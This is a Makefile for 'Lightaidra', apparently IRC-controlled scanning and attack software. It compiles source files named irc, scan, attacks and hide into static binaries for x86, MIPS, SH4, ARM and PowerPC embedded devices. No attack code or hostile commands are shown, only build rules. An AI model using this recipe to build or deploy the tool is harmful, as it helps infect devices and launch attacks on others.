# Makefile -  Lightaidra version 0x2012
# Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
#
# LEGAL DISCLAIMER: It is the end user's responsibility to obey 
# all applicable local, state and federal laws. Developers assume 
# no liability and are not responsible for any misuse or damage 
# caused by this program.

CFLAGS ?= -O2 -pipe
CFLAGS += -Wall -pedantic

LDLIBS  = -lpthread -pthread

MACHINE = $(shell uname -m)

x86_32cc=/usr/bin/gcc -m32
x86_64cc=/usr/bin/gcc -m64 -O2
mipsel_cc=./bin/cross-compiler-mipsel/bin/mipsel-gcc
mips_cc=./bin/cross-compiler-mips/bin/mips-gcc
superh_cc=./bin/cross-compiler-sh4/bin/sh4-gcc
arm_cc=./bin/cross-compiler-armv5l/bin/armv5l-gcc
ppc_cc=./bin/cross-compiler-powerpc/bin/powerpc-gcc

# NAME OF BINARIES:
x86_32bin=bin/x86_32
x86_64bin=bin/x86_64
mipsel_bin=bin/mipsel
mips_bin=bin/mips
superh_bin=bin/sh
arm_bin=bin/arm
ppc_bin=bin/ppc
hide_bin=bin/hide

all: bin/$(MACHINE)

bin/$(MACHINE): source/main.o source/utils.o source/irc.o source/requests.o source/scan.o source/attacks.o | bin
	$(CC) $(LDFLAGS) -o $@ $^ $(LOADLIBES) $(LDLIBS)

bin:
	mkdir -p $@

hide32 : source/hide.c 
	${x86_32cc} -o ${hide_bin} source/hide.c
hide64 : source/hide.c 
	${x86_64cc} -o ${hide_bin} source/hide.c

x86_32 : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${x86_32cc} ${LDLIBS} -o ${x86_32bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c

x86_64 : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${x86_64cc} ${LDLIBS} -o ${x86_64bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c

mipsel : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${mipsel_cc} -static ${LDLIBS} -DMIPSEL -o ${mipsel_bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c

mips : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${mips_cc} -static ${LDLIBS} -DMIPS -o ${mips_bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c
	
superh : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${superh_cc} -static ${LDLIBS} -DSUPERH -o ${superh_bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c
	
arm : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${arm_cc} -static ${LDLIBS} -DARM -o ${arm_bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c
	
ppc : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
	${ppc_cc} -static ${LDLIBS} -DPPC -o ${ppc_bin} source/main.c source/utils.c \
	source/irc.c source/requests.c source/scan.c source/attacks.c

clean :
	rm -fr source/*.o
